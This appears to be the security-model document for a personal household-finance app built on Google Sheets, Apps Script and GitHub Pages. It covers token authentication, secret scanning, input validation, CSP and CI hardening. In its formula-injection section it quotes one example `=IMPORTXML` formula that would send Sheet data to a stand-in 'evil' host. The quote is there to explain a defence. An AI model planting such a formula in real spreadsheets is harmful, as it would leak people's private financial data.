# Security model

## What we protect
Household finances: incomes, bills, balances and loans. They must not leak through the public repo or the public site, and nobody without the passcode should be able to read or change them.

## Where data lives
| Place | What | Who can see it |
| --- | --- | --- |
| Google Sheet | All data | The Sheet owner, plus anyone the owner shares it with |
| Apps Script web app | No data stored; it reads and writes the Sheet | Anyone with the `/exec` link **and** a valid device token |
| Phone or browser | A cache of the data, the Sheet link and a device token (localStorage) | Anyone who can unlock that device |
| GitHub repo and Pages site | Code only | Everyone |

## Protections
**Keeping data out of git**
- `.gitignore` covers spreadsheets, CSV, `data/`, backups, `*.local.*` and `.env`.
- `scripts/scan.sh` blocks those file types. It also blocks Sheet web app links, passcode assignments, device tokens, data-export JSON, and any word in your private `scripts/denylist.local.txt`.
- The scan runs in a pre-commit hook (`git config core.hooksPath scripts/hooks`) and as the first CI step. The site is not deployed unless it passes.

**Authentication**
- The passcode lives only in Apps Script **Script properties** and must be at least 10 characters.
- Connecting trades the passcode for a random 256-bit device token. The server stores only SHA-256 hashes of the tokens, at most 20. Running "Sign out all devices" revokes every token.
- Brute-force guard: 10 wrong passcodes in 10 minutes lock connecting for 15 minutes. Each wrong try is also slowed down.
- Requests are `POST` with the token in the body, never in the URL, so it doesn't land in server logs or browser history. They are sent with `credentials: "omit"`.

**Server-side validation (Code.gs)**
- Collections are whitelisted, ids must match `^[A-Za-z0-9_-]{1,40}$`, and every field is checked against a typed schema: text up to 200 characters, amounts finite and at most ±1e9, dates and enums validated.
- Request bodies are capped at 200 KB.
- Writes are serialized with `LockService`.
- Errors return generic codes. Stack traces stay in the Apps Script logs.
- **Formula injection:** text that starts with `= + - @`, a tab or a CR is stored with a leading `'`. Without that, `=IMPORTXML("https://evil…",A1)` typed as a bill name would run when the Sheet opens and could send data out. Text columns are also formatted as plain text.
- The script's OAuth scope is `spreadsheets.currentonly`: this one Sheet, nothing else in your Drive.

**Browser**
- Content-Security-Policy:
  - scripts come only from the site and cdnjs (no `unsafe-inline`, no `eval`);
  - network calls go only to the site and Google's Apps Script hosts;
  - `object-src 'none'`, `base-uri 'none'` and `form-action 'none'`;
  - `referrer: no-referrer`.
- GSAP is loaded from cdnjs with Subresource Integrity (sha384) pinned to version 3.13.0.
- Every value from data is HTML-escaped before it reaches the page. Data loaded from the Sheet, the cache or a backup is converted to the expected types first (`normalizeData`).
- The Connect screen accepts only `https://script.google.com/macros/s/…/exec` links, so a passcode can't be sent anywhere else.
- **Clickjacking:** GitHub Pages can't send `X-Frame-Options`, and `frame-ancestors` is ignored in a meta tag, so the app refuses to run inside a frame.
- The service worker caches app files only. Requests to the Sheet are never cached.

**CI**
- The GitHub Actions are pinned to commit SHAs.
- Permissions are least privilege: `contents: read`, and `pages: write` plus `id-token: write` only in the deploy job.
- No secrets are used.

## Known limits (accepted)
- Anyone with both the `/exec` link and the passcode has full access. Treat them like a bank PIN.
- Google can read the Sheet, as with any Google Drive file.
- The phone's cache is readable by anyone who can unlock the phone. Use a screen lock, and use "Forget this device" on shared devices. There is no in-app PIN.
- If two phones edit the same payday at the same moment, the last save wins.
- The passcode lockout is global, not per person. Someone who has the `/exec` link can trigger it with 10 wrong tries. That only blocks *new* connections for 15 minutes; phones already connected keep working. Keep the link private.
- Content-Security-Policy `style-src` allows `'unsafe-inline'`, because the views use inline `style` attributes. Script injection is still blocked.

## Reporting
Open a GitHub issue **without** any personal data, or contact the repo owner directly.
